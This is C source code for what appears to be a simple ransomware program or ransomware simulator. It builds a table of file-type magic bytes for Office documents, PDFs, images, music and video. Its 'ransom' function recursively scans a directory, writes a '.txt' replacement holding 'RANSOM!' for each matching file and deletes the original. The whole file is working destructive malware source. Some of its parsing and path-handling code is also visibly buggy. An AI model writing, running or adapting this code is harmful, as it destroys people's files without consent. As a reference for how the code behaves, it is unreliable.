#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <time.h>
#include <dirent.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/time.h>

#define MAX_SIG_SHAPE_SIZE 20

#define NAME_MAX 256
#define PATH_MAX 4096
#define PADDING_SIZE 6
#define BUF_SIZE 1024

typedef struct signature {
	char ext[5];
	unsigned char *data;
	int size;	
	unsigned long offset;
	struct signature *prev, *next;
} signature;

const char *start = "/home/rnd/monitor/";

signature *signature_list;

unsigned char parsing_hex(char ch)
{
	/*
		if the character ch's value is 'f',
		this function returns the hex value 15.
	*/

	if('0' <= ch && ch <= '9')
	{
		return ch - 48; // because ASCII number of '0' is 48
	}
	else if('A' <= ch && ch <= 'F')
	{
		return ch - 55; // because ASCII number of 'A' is 65
	}
	else if('a' <= ch && ch <= 'f')
	{
		return ch - 87; // because ASCII number of 'a' is 97
	}
	else
		return 255;
}

unsigned char *parsing_signature(char *sig_shape_str, int sig_shape_str_size)
{
	/*
	if sig_shape_str is "AB CD EF 01 23 45 67 89",
	ret_sig will be the data {10*(2**4)+11, 12*(2**4)+13, 14*(2**4)+15, 0*(2**4)+1, 2*(2**4)+3, 4*(2**4)+5, 6*(2**4)+7, 8*(2**4)+9};
				       ab            cd            ef           01          23          45          67          89
	*/

	char *sig_shape_ptr = sig_shape_str;
	unsigned char *ret_sig = (unsigned char*)malloc(sizeof(unsigned char) * sig_shape_str_size);
	unsigned char *ret_sig_ptr = ret_sig;
	unsigned char temp;	
	int count = 0;

	while(*sig_shape_ptr != '\0')
	{
		if(*sig_shape_ptr == ' ')
		{
			sig_shape_ptr++;
			continue;
		}
		
		temp = 0;
		/*
		if the partial value of sig_shape_str is "A7",
		*sig_shape_ptr is 'A', and the next character is '7'.
		Additionally, binary value of 'A' and '7' are 1010 and 0111.
		So, 1010 -> 10100000 and 0111 is merged to 10100111.
		Finally, temp is will be hex value A7.
		*/
		temp += parsing_hex(*sig_shape_ptr) << 4;
		temp += parsing_hex(*(sig_shape_ptr + 1));

		*ret_sig_ptr = temp;

		sig_shape_ptr += 2;
		ret_sig_ptr++;
	}

	return ret_sig;
}

void init_signature_list(signature **signature_list)
{
	/*document*/
	add_signature(signature_list, ".ppt", "00 6E 1E F0", 4, 512);
	add_signature(signature_list, ".ppt", "A0 46 1D F0", 4, 512);
	add_signature(signature_list, ".ppt", "FD FF FF FF 0E 00 00 00", 8, 512);
	add_signature(signature_list, ".ppt", "FD FF FF FF 1C 00 00 00", 8, 512);
	add_signature(signature_list, ".ppt", "FD FF FF FF 43 00 00 00", 8, 512);
	add_signature(signature_list, ".ppt", "0F 00 E8 03", 4, 512);
	add_signature(signature_list, ".ppt", "D0 CF 11 E0 A1 B1 1A E1", 8, 0);
	add_signature(signature_list, ".pptx", "50 4B 03 04", 4, 0);
	add_signature(signature_list, ".pptx", "50 4B 03 04 14 00 06 00", 8, 0);
	add_signature(signature_list, ".xls", "D0 CF 11 E0 A1 B1 1A E1", 8, 0);
	add_signature(signature_list, ".xls", "09 08 10 00 00 06 05 00", 8, 512);
	add_signature(signature_list, ".xls", "FD FF FF FF 10 00", 6, 512);
	add_signature(signature_list, ".xls", "FD FF FF FF 1F 00", 6, 512);
	add_signature(signature_list, ".xls", "FD FF FF FF 22 00", 6, 512);
	add_signature(signature_list, ".xls", "FD FF FF FF 23 00", 6, 512);
	add_signature(signature_list, ".xls", "FD FF FF FF 28 00", 6, 512);
	add_signature(signature_list, ".xls", "FD FF FF FF 29 00", 6, 512);
	add_signature(signature_list, ".xls", "FD FF FF FF 10 02", 6, 512);
	add_signature(signature_list, ".xls", "FD FF FF FF 1F 02", 6, 512);
	add_signature(signature_list, ".xls", "FD FF FF FF 22 02", 6, 512);
	add_signature(signature_list, ".xls", "FD FF FF FF 23 02", 6, 512);
	add_signature(signature_list, ".xls", "FD FF FF FF 28 02", 6, 512);
	add_signature(signature_list, ".xls", "FD FF FF FF 29 02", 6, 512);
	add_signature(signature_list, ".xls", "FD FF FF FF 20 00 00 00", 8, 512);
	add_signature(signature_list, ".xlsx", "50 4B 03 04", 4, 0);
	add_signature(signature_list, ".xlsx", "50 4B 03 04 14 00 06 00", 8, 0);
	add_signature(signature_list, ".doc", "D0 CF 11 E0 A1 B1 1A E1", 8, 0);
	add_signature(signature_list, ".doc", "EC A5 C1 00", 4, 512);
	add_signature(signature_list, ".doc", "0D 44 4F 43", 4, 0);
	add_signature(signature_list, ".doc", "31 BE 00 00 00 AB", 6, 0);
	add_signature(signature_list, ".doc", "7F FE 34 0A", 4, 0);
	add_signature(signature_list, ".doc", "9B A5", 2, 0);
	add_signature(signature_list, ".doc", "DB A5 2D 00", 4, 0);
	add_signature(signature_list, ".doc", "12 34 56 78 90 FF", 6, 0);
	add_signature(signature_list, ".doc", "CF 11 E0 A1 B1 1A E1 00", 8, 0);
	add_signature(signature_list, ".docx", "50 4B 03 04", 4, 0);
	add_signature(signature_list, ".docx", "50 4B 03 04 14 00 06 00", 8, 0);
	add_signature(signature_list, ".pdf", "25 50 44 46", 4, 0);

	/*image*/
	add_signature(signature_list, ".jpg", "FF D8 FF E0 00 10 4A 46 49 46 00 01", 12, 0);
	add_signature(signature_list, ".jpg", "FF D8 FF E1 xx xx 45 78 69 66 00 00", 12, 0);
	add_signature(signature_list, ".jpg", "FF D8 FF E8 xx xx 53 50 49 46 46 00", 12, 0);
	add_signature(signature_list, ".png", "89 50 4E 47 0D 0A 1A 0A", 8, 0);

	/*music*/
	add_signature(signature_list, ".mp3", "49 44 33", 3, 0);
	add_signature(signature_list, ".mp3", "FF FB", 2, 0);
	add_signature(signature_list, ".flac", "66 4C 61 43", 4, 0);

	/*media*/
	add_signature(signature_list, ".mp4", "66 74 79 70 4D 53 4E 56", 8, 4);
	add_signature(signature_list, ".mp4", "66 74 79 70 4D 53 4E 56", 8, 4);
	add_signature(signature_list, ".mp4", "66 74 79 70 69 73 6F 6D", 8, 4);
	add_signature(signature_list, ".mp4", "00 00 00 18 66 74 79 70 33 67 70 35", 12, 0);
	add_signature(signature_list, ".mkv", "1A 45 DF A3", 4, 0);
}

signature *make_signature_node(char ext[5], char *sig_shape_str, int sig_shape_str_size, int offset)
{
	signature *new_sig = (signature*)malloc(sizeof(signature));
	strcpy(new_sig->ext, ext);
	new_sig->data = parsing_signature(sig_shape_str, sig_shape_str_size);
	new_sig->size = sig_shape_str_size;
	new_sig->offset = offset;
	new_sig->prev = NULL;
	new_sig->next = NULL;
	
	return new_sig;
}

void add_signature(signature **head, char ext[5], char *sig_shape_str, int sig_shape_str_size, int offset)
{
	signature *ptr = *head;
	
	if(ptr == NULL)
	{
		*head = make_signature_node(ext, sig_shape_str, sig_shape_str_size, offset);
		return;
	}
	
	while(ptr->next != NULL)
		ptr = ptr->next;
		
	ptr->next = make_signature_node(ext, sig_shape_str, sig_shape_str_size, offset);
	ptr->next->prev = ptr;
}

int is_signature_in(char *file_path, signature *signature_list)
{
	/*
	If the file's extention and signature are in signature_list, return 1.
	If not, return 0.
	*/
	FILE *fp = fopen(file_path, "rb");

	if(!fp)
	{
		printf("Cannot open this file.\n");
		return 0;
	}

	signature *ptr = signature_list;
	unsigned char temp[MAX_SIG_SHAPE_SIZE];
	memset(temp, 0, MAX_SIG_SHAPE_SIZE);

	while(ptr != NULL)
	{
		if(!strcmp(ptr->ext, file_path + strlen(file_path) - strlen(ptr->ext)))
		{
			fseek(fp, ptr->offset, SEEK_SET);
			fread(temp, 1, ptr->size, fp);
			if(!memcmp(temp, ptr->data, ptr->size))
				return 1;
		}

		ptr = ptr->next;
	}
	return 0;
}

void flush_signature_nodes(signature **head)
{
	signature *ptr;

	while(*head != NULL)
	{
		ptr = *head;
		*head = (*head)->next;
		free(ptr);
	}
}

int ransom(char *start_dir, signature *signature_list)
{
	DIR *dir_info = NULL;
	struct dirent *dir_entry = NULL;
	struct stat buf;
	int dir_mode_err, ret, flag = 0, cannot_access = 0, save_perm = 0, save_uid, wd;

	char *path = (char*)malloc(sizeof(char) * PATH_MAX);

	dir_info = opendir(start_dir);

	if(NULL == dir_info)
	{
		printf("cannot open directory \"%s\".\n", start_dir);
		return -1;
	}
	
	while((dir_entry = readdir(dir_info)) != NULL)
	{
		flag = 0;
		
		if((strcmp(dir_entry->d_name, "..") == 0) || (strcmp(dir_entry->d_name, ".") == 0))
			continue;

		sprintf(path, "%s%s", start_dir, dir_entry->d_name);

		dir_mode_err = lstat(path, &buf);

		if(dir_mode_err == -1)
		{
			puts("dirmode Error!\n");
			break;
		}

		if(access(path, W_OK|R_OK|X_OK) == -1)
		{
			printf("cannot access to this file.\n");
		}
		else if(S_ISDIR(buf.st_mode))
		{
			//printf("[Directory Name : %s\n\n]", dir_entry->d_name);
			strcat(path, "/");
			ransom(path, signature_list);
		}

		else if(S_ISREG(buf.st_mode))
		{
			if(is_signature_in(path, signature_list))
			{
				char ransom_path[PATH_MAX] = "";
				char buf[BUF_SIZE] = "";
				
				strcpy(ransom_path, path);
				strcat(ransom_path + strlen(ransom_path) - 4, ".txt");
				printf("%s\n", ransom_path);
				FILE *rfp = fopen(path, "rb");
				FILE *wfp = fopen(ransom_path, "wb");

				fread(buf, BUF_SIZE, 1, rfp);
				strcpy(buf, "RANSOM!\n");
				fwrite(buf, BUF_SIZE, 1, wfp);

				fclose(rfp);
				fclose(wfp);
				
				unlink(path);	
			}	
		}
	}

	closedir(dir_info);
	return 0;
}

int main()
{
	init_signature_list(&signature_list);
	ransom(start, signature_list);
	flush_signature_nodes(&signature_list);
	return 0;
}
